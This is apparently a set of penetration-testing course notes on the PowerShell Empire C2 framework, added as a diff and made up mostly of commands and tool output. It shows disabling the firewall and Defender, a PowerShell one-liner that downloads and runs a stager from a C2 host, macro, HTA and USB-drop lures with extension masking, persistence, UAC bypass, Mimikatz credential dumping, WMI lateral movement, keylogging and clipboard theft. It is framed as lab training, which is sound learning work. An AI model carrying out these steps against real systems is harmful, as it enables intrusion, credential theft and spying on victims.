@@ -1,0 +1,569 @@
+Disable Firewall:
+C:\> netsh advfirewall set allprofiles state off
+Disable AV(Windows Defender):
+C:\> sc config WinDefend start= disabled
+C:\> sc stop WinDefend
+
+Empire Quick Start:
+# wget https://github.com/EmpireProject/Empire/archive/master.zip
+# unzip master.zip
+# ls -lsah
+# cd Empire-master
+# cd setup/
+# ./install.sh
+# cd ../
+# ls -l
+
+Empire Terminology:
+-Stagers: code that establishes connections to Empire C2 server (payloads run on victim systems)
+-Listeners: service on Empire C2 server that receives and handles connections from executed stagers
+-Agents: Infected hosts (victims, targets, etc..)
+-Modules: scripts that perform specific tasks on an infected host, such as gaining persistence, performing privilege escalation, etc..
+
+How Empire C2 Works:
+-Empire agents are asynchronous; they poll the C2 server for tasking at user specified intervals (default: 5 seconds)
+-Uses HTTP GET requests to poll for taskings
+-Uses HTTP POST requests to send data
+-Empire communications are encrypted; designed to appear benign and blend in with normal activity
+
+Lab 2.2: Empire Quick Start
+-You will configure an Empire HTTP listener
+-You will generate an Empire stager, “multi/launcher”
+-You will establish C2 over your Windows 10 VM and execute shell commands
+-You will use your first Empire post-exploitation module:
+	situational_awareness/host/computerdetails
+
+(Empire) > help
+
+Commands
+========
+agents            Jump to the Agents menu.
+creds             Add/display credentials to/from the database.
+exit              Exit Empire
+help              Displays the help menu.
+interact          Interact with a particular agent.
+list              Lists active agents or listeners.
+listeners         Interact with active listeners.
+load              Loads Empire modules from a non-standard folder.
+plugin            Load a plugin file to extend Empire.
+plugins           List all available and active plugins.
+preobfuscate      Preobfuscate PowerShell module_source files
+reload            Reload one (or all) Empire modules.
+report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log
+reset             Reset a global option (e.g. IP whitelists).
+resource          Read and execute a list of Empire commands from a file.
+searchmodule      Search Empire module names/descriptions.
+set               Set a global option (e.g. IP whitelists).
+show              Show a global option (e.g. IP whitelists).
+usemodule         Use an Empire module.
+usestager         Use an Empire stager.
+
+Configure HTTP listener:
+1. Execute Empire script on Kali:
+	# ./empire
+2. Drop into listeners context:
+	(Empire) > listeners
+3. Select HTTP listener:
+	(Empire: listeners) > uselistener http
+4. Execute listener:
+	(Empire: listeners) > execute
+
+-Use Tab for autocompletion and press space Tab twice for options
+(Empire) > listeners
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > info
+(Empire: listeners/http) > set DefaultDelay 1
+(Empire: listeners/http) > execute
+(Empire: listeners/http) > main – back to main menu
+(Empire) > listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  http              http            http://10.0.3.5:80                   1/0.0
+
+Deploy Empire Stager:
+1. Select new stager, multi/launcher:
+	(Empire) > usestager multi/launcher
+2. Specify listener (HTTP):
+	(Empire: stager/multi/launcher) > set listener http
+3. Generate stager script:
+	(Empire: stager/multi/launcher) > execute
+4. Copy stager script to clipboard (right click, copy), paste into a terminal on your Windows VM
+
+(Empire) > usestager
+multi/bash                osx/dylib                 windows/backdoorLnkMacro  windows/launcher_sct
+multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs
+multi/macro               osx/launcher              windows/csharp_exe        windows/launcher_xml
+multi/pyinstaller         osx/macho                 windows/dll               windows/macro
+multi/war                 osx/macro                 windows/ducky             windows/macroless_msword
+osx/applescript           osx/pkg                   windows/hta               windows/shellcode
+osx/application           osx/safari_launcher       windows/launcher_bat      windows/teensy
+osx/ducky                 osx/teensy                windows/launcher_lnk
+
+(Empire) > usestager multi/launcher
+(Empire: stager/multi/launcher) > info
+(Empire: stager/multi/launcher) > set Listener http
+(Empire: stager/multi/launcher) > generate
+	Copy payload into terminal on windows machine
+(Empire: stager/multi/launcher) > agents
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------
+ FCYETU48 ps 10.0.3.4        IE8WIN7           *IE8WIN7\IEUser         powershell         1416   1/0.0    2019-04-09 13:50:33
+
+(Empire: agents) > [*] Sending POWERSHELL stager (stage 1) to 10.0.3.4
+[*] New agent FCYETU48 checked in
+[+] Initial agent FCYETU48 from 10.0.3.4 now active (Slack)
+[*] Sending agent (stage 2) to FCYETU48 at 10.0.3.4
+
+Shell Commands and Modules:
+1. View and manage infected hosts in the agents menu:
+	(Empire) > agents
+	(Empire) > interact <agent name>
+2. Execute shell commands:
+	(Empire: Win10Agent) > shell <shell command>
+	(Empire: Win10Agent) > shell systeminfo
+3. Execute modules commands:
+	(Empire: Win10Agent) > usemodule <module name>
+	(Empire: Win10Agent) > set <options> <parameter>
+	(Empire: Win10Agent) > execute
+
+(Empire) > agents
+(Empire: agents) > rename FCYETU48 Win7
+(Empire: agents) > interact Win7
+(Empire: Win7) > help
+(Empire: Win7) > shell whoami
+(Empire: Win7) > shell systeminfo
+(Empire: Win7) > usemodule trollsploit/rick_ascii
+(Empire: powershell/trollsploit/rick_ascii) > info
+(Empire: powershell/trollsploit/rick_ascii) > execute
+[>] Module is not opsec safe, run? [y/N] y – means the user will be notified
+Housekeeping: Killing Agents:
+1. Terminate agents using the kill command:
+	(Empire) > agents
+	(Empire: agents) > kill <agent name>
+	(Empire: agents) > kill all
+2. Clean database using the clear command:
+	(Empire: agents) > clear <agent name>
+	(Empire: agents) > clear all
+3. Revert your VMs to good state
+
+ (Empire: agents) > kill Win7
+[>] Kill agent 'Win7'? [y/N] y
+(Empire: agents) > kill all
+(Empire: agents) > agents
+(Empire: agents) > clear all
+
+Module 3: The Initial Compromise:
+-Overview: The Initial Compromise – how can we attain initial code execution on our victims?
+-We will explore several techniques:
+	1. Physical Access to terminal, web browser, or removable media
+	2. Weaponizing Word Documents with Macros
+	3. Creating malicious HTML Applications
+	4. Constructing Removable Media Payloads and extension masking
+
+Overview:  The Initial Compromise:
+-The initial compromise is where we first establish C2 on one or more systems in the target network – but how do we get there?
+-We need to find a way to get targets to execute our PowerShell Empire stager (or similar payload)
+-The quickest, most reliable means of compromise is to target the user through Social Engineering
+-Spear Phishing documents, Removable Media Drops, etc..
+
+Physical Access Attacks:
+-Compromise is trivial if an attacker has physical access to a device
+-You can use boot loaders or live CDs to bypass logins screens or disable authentication (Kon-Boot, Hirens Boot CD)
+-You can insert auto-pwn devices (USB Rubber Duckeys, LAN turtles)
+-You can pull the hard drive and steal sensitive data
+-What if the device is unlocked? Just download and execute a payload! Time to pwn: < 5 seconds…
+
+Physical Access Flowchart:
+-Can you find an unattended computer? → No: Keep Looking
+Yes: Is the screen unlocked → No Keep Looking
+Yes: Can You open a terminal → No: Can you open an Internet Browser → No: Can you use removable media – yes to any of those and they are pwned otherwise keep looking
+
+Lab 3.1: Physical Access Attacks
+-We’re going to create an Empire stager: launcher_bat
+-The launcher_bat stager creates a self-deleting .bat file
+-We will generate launcher_bat then serve it on a web server
+-We will then download launcher_bat onto our victim, and execute the stager
+
+1. Configure Empire’s HTTP Listener
+2. Generate Empire stager:
+	(Empire) > usestager windows/launcher_bat
+	(Empire) > set Listener http
+	(Empire) > generate
+3. Start a web server that will serve Empire stager to target
+	# python -m SimpleHTTPServer 8080
+4. Download and execute stager on target
+	Terminal, web browser, removable media
+PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://10.0.3.5:8080/launcher.bat’,’launcher.bat’); Start-Process ‘launcher.bat’
+
+(Empire) > listeners
+(Empire: listeners) > usestager windows/launcher_bat
+(Empire: stager/windows/launcher_bat) > set Listener http
+(Empire: stager/windows/launcher_bat) > generate
+
+[*] Stager output written out to: /tmp/launcher.bat
+
+# python -m SimpleHTTPServer 8080
+-Copy launcher.bat to webserver directory download and run on windows vm
+-Run the following one liner directly on the machine:
+PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://10.0.3.5:8080/launcher.bat’,’launcher.bat’); Start-Process ‘launcher.bat’
+
+Weaponizing Office Documents
+-So you can’t walk into the target organization… what next?
+-You can insert malicious macros into Microsoft Office Documents!
+-Deliver weaponized document to target(email, web portals, removable media drops)
+-Wait for victim to open document and enable macros
+-make document appear legitimate and enticing to improve success
+
+Lab 3.2: Weaponizing Office Documents
+1. Configure Empire’s HTTP Listeners
+2. Generate Empire Stager
+	(Empire) > usestager windows/macro
+	(Empire) > set Listener http
+	(Empire) > generate
+3. Copy and paste stager script into an Office Macro
+4. Make document appear enticing and legitimate
+5. Deliver weaponized document to target, wait for clicks
+
+(Empire) > usestager windows/macro
+(Empire: stager/windows/macro) > set Listener http
+(Empire: stager/windows/macro) > generate
+[*] Stager output written out to: /tmp/macro
+-Copy and paste data in /tmp/macro to a word file View>Macros>Give it a name and paste data from file into the macro
+-Save as a .docm (macro enabled document)
+
+Evil HTML Applications:
+-Some organizations globally disable Office Macros...what then?
+-A document containing a malicious url can be just as effective.
+-You will create a weaponized HTML Application
+-Victim clicks link, clicks “yes”, then gets owned
+-Imagine receiving an email containing a job announcement that promises a generous (yet realistic) salary
+
+Lab 3.3: Evil HTML Applications:
+1. Configure Empire’s HTTP Listeners
+2. Generate Empire stager:
+	(Empire) > usestager windows/hta
+	(Empire) > set Listener http
+	(Empire) > generate
+3. Start a web server that will serve Empire stager to target
+	# python -m SimpleHTTPServer 8080
+4. Insert weaponized HTA download link into a document/email
+5. Send document to targets, wait for clicks
+
+(Empire: listeners) > usestager windows/hta
+(Empire: stager/windows/hta) > set Listener http
+(Empire: stager/windows/hta) > generate
+-Copy payload and paste into hta file
+# cd /tmp
+# mkdir working
+# cd working
+# nano evil.hta
+# python -m SimpleHTTPServer 8080
+Go to workstation and click on:
+	http://172.28.128.4:8080/evil.hta
+
+Removable Media Drop:
+-Sometimes the easiest way to initial compromise is to leave an enticing USB stick or CD near target
+-Imagine finding a CD with legitimate looking CLASSIFIED labels
+-Most people will take such a find directly to security...who will open the file to determine what data was compromised(nice!)
+
+Lab 3.4:Removable media
+-Most organizations don’t allow auto-executable content from USB drives or CDs
+-A little social engineering can help us get the user to open the file
+-You can make a weaponized bat file look like an ordinary text file by using excessive white spaces to hide the extension – extension masking
+
+(Empire) > usestager multi/launcher
+(Empire: stager/multi/launcher) > set Listener http
+(Empire: stager/multi/launcher) > generate
+-Create bat file and rename using spaces to push the bat extensions back so the user doesn’t see it
+
+Module 4: Gaining a Foothold:
+-Overview: Gaining a foothold
+-Gaining userland persistence via the registry and schtasks
+-Understanding situational awareness
+-Identifying antivirus products
+-Performing Windows enumeration
+
+Overview: Gaining a foothold
+-You’ve established C2 on a victim! Now what?
+-Your access may be short lived; can you survive a reboot?
+-Situational Awareness – are there any threats to your access?
+-You need to maintain access long enough to complete the pentest objectives
+-You need to begin collecting information to facilitate privilege escalation, lateral movement, and data collection
+
+Userland Persistence
+-Following most client side attacks you attain the privilege level of the compromised process (that is, a lowly user)
+-We want administrator, but that may take time
+-You may lose access if the victim user logs off or reboots
+-You may need to establish “userland” persistence so that you can escalate privileges and move laterally
+-We will explore two Empire userland persistence modules registry and schtasks
+
+Lab 4.1: userland/persistence/registry
+-Adds a registry key to execute Empire stager when the current user logs back into the system
+-HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+-Can store stager in the registry, an alternate data stream, or event log ID (uses registry by default)
+	(Empire) > usemodule persistence/userland/registry
+	(Empire) > set Listener http
+	(Empire) > execute
+-Not OPSEC safe! This module will cause a terminal to briefly appear on the screen, alerting defenders
+
+(Empire) > usestager multi/launcher
+(Empire: stager/multi/launcher) > set Listener http
+(Empire: stager/multi/launcher) > generate
+(Empire: stager/multi/launcher) > agents
+[*] Active agents:
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------
+ W3ZFX9GV ps 10.0.3.6        METASPLOITABLE3   *METASPLOITABLE3\vagran powershell         6108   1/0.0    2019-04-09 18:28:30
+(Empire: agents) > interact W3ZFX9GV
+(Empire: W3ZFX9GV) > usemodule persistence/userland/registry
+(Empire: powershell/persistence/userland/registry) > info
+(Empire: powershell/persistence/userland/registry) > set Listener http
+(Empire: powershell/persistence/userland/registry) > execute
+[>] Module is not opsec safe, run? [y/N] y
+[*] Tasked W3ZFX9GV to run TASK_CMD_WAIT
+[*] Agent W3ZFX9GV tasked with task ID 1
+[*] Tasked agent W3ZFX9GV to run module powershell/persistence/userland/registry
+(Empire: powershell/persistence/userland/registry) > [*] Agent W3ZFX9GV returned results.
+Registry persistence established using listener http stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.
+[*] Valid results returned by 10.0.3.6
+-Reboot Windows VM to test persistence
+
+Lab 4.2: userland/persistence/registry
+-Schtasks can execute stager daily at a specific time or after the target user has been idle for a specified time
+-Idle time is generally a better option
+-Not OPSEC safe! Will briefly flash a terminal!
+	(Empire) > usemodule persistence/userland/registry
+	(Empire) > set IdleTime 1
+	(Empire) > set Listener http
+	(Empire) > execute
+-Empire provides a cleanup option that will restore the system to it’s original state
+
+(Empire) > agents
+(Empire: agents) > interact EDRM87CN
+(Empire: EDRM87CN) > usemodule persistence/userland/schtasks
+(Empire: powershell/persistence/userland/schtasks) > set IdleTime 1 – means payload will run after 1 minute of idle time
+(Empire: powershell/persistence/userland/schtasks) > set Listener http
+(Empire: powershell/persistence/userland/schtasks) > execute
+[>] Module is not opsec safe, run? [y/N] y
+[*] Tasked EDRM87CN to run TASK_CMD_WAIT
+[*] Agent EDRM87CN tasked with task ID 1
+[*] Tasked agent EDRM87CN to run module powershell/persistence/userland/schtasks
+(Empire: powershell/persistence/userland/schtasks) > [*] Agent EDRM87CN returned results.
+SUCCESS: The scheduled task "Updater" has successfully been created.
+Schtasks persistence established using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater idle trigger on 1.
+[*] Valid results returned by 10.0.3.6
+[*] Sending POWERSHELL stager (stage 1) to 10.0.3.6
+[*] New agent 2HG5RWSX checked in
+[+] Initial agent 2HG5RWSX from 10.0.3.6 now active (Slack)
+[*] Sending agent (stage 2) to 2HG5RWSX at 10.0.3.6
+-Go to windows Task Scheduler and look at Updater and run the task to see another connection
+
+Situational Awareness:
+-Now that we have persistence, we have time to reinforce our foothold and understand our surroundings
+-Situational awareness enables us to identify any threats to our access and make informed decisions about next steps
+-Empire offers modules to enumerate personal security products and perform common enumeration techniques
+
+Lab 4.3: Enumerating Antivirus
+-AntiVirus can hinder your freedom of movement in the network
+-If you can identify the target’s anti-virus you can develop appropriate counter measures
+	(Empire) > usemodule situational_awareness/host/antivirusproduct
+	(Empire) > execute
+-Antivirus is little more than a road block when dealing with a skilled attacker
+
+(Empire) > agents
+(Empire: agents) > interact G5HCVYNW
+(Empire: G5HCVYNW) > usemodule situational_awareness/host/antivirusproduct
+(Empire: powershell/situational_awareness/host/antivirusproduct) > info
+(Empire: powershell/situational_awareness/host/antivirusproduct) > execute
+[*] Tasked G5HCVYNW to run TASK_CMD_JOB
+[*] Agent G5HCVYNW tasked with task ID 1
+[*] Tasked agent G5HCVYNW to run module powershell/situational_awareness/host/antivirusproduct
+(Empire: powershell/situational_awareness/host/antivirusproduct) > [*] Agent G5HCVYNW returned results.
+Job started: TFC9S8
+[*] Valid results returned by 10.0.3.6
+[*] Agent G5HCVYNW returned results.
+Definition Status           : Unknown
+Computername                : METASPLOITABLE3
+Name                        :
+Real-time Protection Status : Unknown
+ProductExecutable           :
+Get-AntiVirusProduct completed!
+[*] Valid results returned by 10.0.3.6
+
+Lab 4.4: Local System Enumeration
+-We need to understand as much as we can about our infected host so that we can figure out how to escalate privileges
+-Empire offers a useful enumeration script that automates this process
+	(Empire) > usemodule situational_awareness/host/winenum
+	(Empire) > execute
+-Takes some time to finish; generates a lot of output!
+
+(Empire) > agents
+(Empire: agents) > interact G5HCVYNW
+(Empire: G5HCVYNW) > usemodule situational_awareness/host/winenum
+(Empire: powershell/situational_awareness/host/winenum) > execute
+
+Module 5: Escalating Privileges
+Module Roadmap:
+-Overview: Privilege Escalation
+-Finding priv-esc vulnerabilities with PowerView
+-User Account Control (UAC) Primer
+-UAC Bypass Techniques
+-Own the system with Get-System
+-Elevated Persistence Techniques
+
+Overview: Escalating Privileges
+-You have an enduring foothold into the target network
+-But in order to have total freedom of action, you need to escalate to a privileged account (domain admin, root, etc.)
+-Privileged accounts can enable you to access critical database-Empire offers several modules to enable privilege escalation: PowerView, Bypass UAC, Get-System and more
+
+Lab 5.1: privesc/powerup/allchecks
+-Empire’s PowerUp module will search through a series of configurations to find privilege escalation vulnerabilities
+-Looks for vulnerable services, latent passwords, UAC bypasses and more
+-offers a useful starting point for deeper examination
+(Empire: Win7) > usemodule privesc/powerup/allchecks
+(Empire: powershell/privesc/powerup/allchecks ) > execute
+
+(Empire: agents) > interact G5HCVYNW
+(Empire: G5HCVYNW) > usemodule privesc/powerup/allchecks
+(Empire: powershell/privesc/powerup/allchecks) > execute
+
+User Account Control
+-UAC is a security feature introduced with Windows Vista
+-Enforces process integrity levels: high, medium and low
+-UAC ensures that if the user is a local admin, most of their applications will run with medium integrity (unless they right click and “run as administrator”)
+-For pentesters, this means if you compromise a local admin via client side attack, you’ll still only have the privileges of a medium or low integrity process
+
+Lab 5.2: privesc/bypass_uac
+-Empire offers the bypass_uac module to escape a medium integrity process
+-Utilizes trusted publisher certificate through process injection
+-Spawns process (powershell.exe) with UAC flag turned off
+  	(Empire: Win7) > usemodule privesc/bypassuac
+	(Empire: powershell/privesc/powerup/bypass_uac) > set Listener http
+	(Empire: powershell/privesc/powerup/bypass_uac) > execute
+
+(Empire) > agents
+(Empire: agents) > interact G5HCVYNW
+(Empire: G5HCVYNW) > usemodule privesc/bypassuac
+(Empire: powershell/privesc/bypassuac) > info
+(Empire: powershell/privesc/bypassuac) > set Listener http
+(Empire: powershell/privesc/bypassuac) > execute
+[>] Module is not opsec safe, run? [y/N] y
+
+Lab 5.3: privesc/getsystem
+-The getsystem module will attempt to elevate to system using one of two techniques
+-Either named pipe impersonation or token duplication
+-Getsystem is an effective follow up to bypass_uac to gain total control over the victim system
+	(Empire: Win7) > usemodule privesc/getsystem*
+	(Empire: powershell/privesc/getsystem) > execute
+
+(Empire: agents) > interact 2HG5RWSX
+(Empire: 2HG5RWSX) > usemodule privesc/getsystem*
+(Empire: powershell/privesc/getsystem) > execute
+
+Lab 5.4: privesc/ask
+-Another method to bypass UAC is to repeatedly spam UAC prompts until the user clicks “yes” using privesc/ask module
+-Will run Empire stager in a high integrity process; you can then use modules like “getsystem” to elevate to system accounts-By no means opsec safe, but will work if you’re out of options
+	(Empire: Win7) > usemodule privesc/ask
+	(Empire: powershell/privesc/ask) > set Listener http
+	(Empire: powershell/privesc/ask) > execute
+
+(Empire: agents) > interact Win7
+(Empire: Win7) > usemodule privesc/ask
+(Empire: powershell/privesc/ask) > set Listener http
+(Empire: powershell/privesc/ask) > execute
+(Empire: agents) > interact 2HG5RWSX
+(Empire: 2HG5RWSX) > usemodule privesc/getsystem*
+(Empire: powershell/privesc/getsystem) > execute
+
+Lab 5.5: Elevated Persistence
+-Now that we have administrator privileges, we can reinforce our foothold with additional persistence techniques
+-Empire offers modules following the naming convention, “persistence/elevated/*”
+-Includes schtasks, registry, and wmi
+(Empire: Elevated) > usemodule persistence/elevated/registry
+(Empire: persistence/elevated/registry) > set Listener http
+(Empire: persistence/elevated/registry) > execute
+
+(Empire: 2HG5RWSX) > usemodule persistence/elevated/registry
+(Empire: persistence/elevated/registry) > set Listener http
+(Empire: persistence/elevated/registry) > execute
+
+Module 6: Lateral Movement & Collection
+Module Roadmap:
+-Overview: Collection and Lateral Movement
+-Dumping Credentials with Mimikatz
+-Lateral movement with Invoke-WMI
+-Other lateral movement techniques: PsExec, pass-the-hash, and PSRemoting
+-Pilfering data: screenshots, keylogging, and clipboard theft
+
+Overview: Collection & Lateral Movement
+-Attackers continuously hunt for sensitive data: usernames, passwords, sensitive documents, emails, databases, etc.
+-Credentials collected on one system will be recycled on others
+-Through this iterative process of collect, recycle, and spread, attackers pivot mercilessly through target networks
+-A good pentester will emulate these techniques
+-We will cover several collection modules and lateral movement techniques throughout this section
+
+Lab 6.1: Dumping Credentials with Mimikatz
+-mimikatz is an amazing tool that extracts password hashes or even plaintext passwords in memory
+-While password is encrypted in memory, a copy of the secret key is also accessible in memory allowing for decryption
+	(Empire Win7) > usemodule credentials/mikikatz/logonpasswords*
+	(Empire Win7) > execute
+
+(Empire: agents) > interact Win7
+(Empire: Win7) > usemodule credentials/mikikatz/logonpasswords*
+(Empire: credentials/mikikatz/logonpasswords) > execute
+-Plaintext password in wdigest function and NTLM hashes used in pass-the-hash attacks
+
+Lab 6.2: Lateral Movement with WMI
+-What to do after getting credentials? REUSE THEM!
+-Invoke-WMI module allows for easy lateral movement with creds
+-Requires that TCP 445 be accessible
+	(Empire Win7) > usemodule lateral_movement/invoke_wmi
+	(Empire Win7) > set Listener http
+	(Empire Win7) > set ComputerName <IP or hostname of next target>
+	(Empire Win7) > set UserName <Username>
+	(Empire Win7) > set Password <password>
+	(Empire Win7) > execute
+
+(Empire: agents) > interact Win7
+(Empire: Win7) > usemodule lateral_movement/invoke_wmi
+(Empire: powershell/lateral_movement/invoke_wmi) >  set Listener http
+(Empire: powershell/lateral_movement/invoke_wmi) >  set  ComputerName 10.10.10.2
+(Empire: powershell/lateral_movement/invoke_wmi) >  set  UserName administrator
+(Empire: powershell/lateral_movement/invoke_wmi) >  set Password password
+(Empire: powershell/lateral_movement/invoke_wmi) > execute
+
+Other Lateral Movement Techniques:
+-Empire has several other lateral movement modules that are worth experimenting with: pass-the-hash, PsExec, PsRemoting
+-Typically require domain administrator (among other conditions) to utilizes-For best results, build a small Active Directory lab and practice
+-Now that you can freely pivot throughout the environment, we will demonstrate additional collection modules
+
+Lab 6.3: Collecting Screenshots
+-Empire's screenshot module will take a screenshot of the victim's desktop
+-Can be used to demonstrate impact to executive management
+	(Empire: Win7) > usemodule collection/screenshot
+	(Empire: Win7) > execute
+
+(Empire: agents) > interact Win7
+(Empire: Win7) > usemodule collection/screenshot
+(Empire: powershell/collection/screenshot) > execute
+Output saved to /.downloads/Win7/screenshot/IE8WIN7_2018-02-24_10-22-33.png
+
+Lab 6.4: Keylogging
+-collection/keylogger module captures victim's keystrokes to a file
+-Can be useful for capturing sensitive data (passwords, emails, etc.)
+	(Empire: Win7) > usemodule collection/keylogger
+	(Empire: Win7) > execute
+-Results are stored in a text file in:
+	Empire/downloads/<AgentName>/keystrokes.txt
+
+Lab 6.5: Clipboard Theft
+-Clipboard monitor will grab whatever is on the victim's clipboard
+-Can be useful for grabbing passwords or other data
+
+	(Empire: Win7) > usemodule collection/clipboard_monitor
+	(Empire: Win7) > execute
